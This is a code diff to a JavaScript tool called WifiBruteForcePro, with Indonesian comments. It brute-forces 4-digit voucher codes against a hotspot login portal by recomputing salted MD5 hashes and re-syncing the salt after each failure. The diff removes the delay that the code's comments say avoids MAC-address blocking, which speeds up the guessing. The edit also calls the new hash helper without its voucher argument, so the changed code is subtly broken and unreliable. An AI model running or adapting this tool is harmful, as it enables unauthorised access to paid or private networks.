@@ -32,6 +32,10 @@ class WifiBruteForcePro {
         return false;
     }
 
+    theHash (voucher) {
+        return hexMD5(this.currentSalt1 + voucher + this.currentSalt2);
+    }
+
     // 3. Generator: Membuat 4-digit kode (tanpa 0 di depan, tanpa urutan gampang)
     _generateSmartCodes() {
         const result = [];
@@ -87,12 +91,13 @@ class WifiBruteForcePro {
             this.attemptCount++;
 
             // Hitung Hash MD5 dengan Salt terbaru
-            const hashedPassword = hexMD5(this.currentSalt1 + voucher + this.currentSalt2);
-
+            const hashedPassword = this.theHash()
+            console.log(hashedPassword)
             const params = new URLSearchParams();
             params.append('username', voucher);
             params.append('password', hashedPassword);
             params.append('dst', 'http://www.msftconnecttest.com/redirect');
+            params.append('popup', "true");
 
             try {
                 const response = await fetch(this.targetUrl, {
@@ -112,7 +117,7 @@ class WifiBruteForcePro {
 
                 // Ambil Salt baru dari response gagal tadi untuk percobaan berikutnya
                 if (this._updateSaltFromHtml(resHtml)) {
-                    console.log(`[${this.attemptCount}] Mencoba: ${voucher} | Salt Synced OK`);
+                    console.log(`[${this.attemptCount}] Failed : ${voucher} | Salt Synced : ${this.theHash()}` );
                 } else {
                     console.warn(`[${this.attemptCount}] Gagal ambil Salt baru. Mencoba reload Salt...`);
                     const reload = await fetch(this.targetUrl);
@@ -120,13 +125,13 @@ class WifiBruteForcePro {
                 }
 
             } catch (err) {
-                console.error("⚠️ Koneksi terputus. Menunggu 5 detik...");
-                await new Promise(r => setTimeout(r, 5000));
+                console.error(err.message + " - ⚠️ Koneksi terputus. await...");
+                await new Promise(r => setTimeout(r, 1000));
             }
 
             // Jeda 2-4 detik (PENTING agar tidak kena blokir MAC)
-            const jitter = 100 //Math.floor(Math.random() * 2000) + 2000;
-            await new Promise(r => setTimeout(r, jitter));
+            // const jitter = 100 //Math.floor(Math.random() * 2000) + 2000;
+            // await new Promise(r => setTimeout(r, jitter));
         }
     }
 }
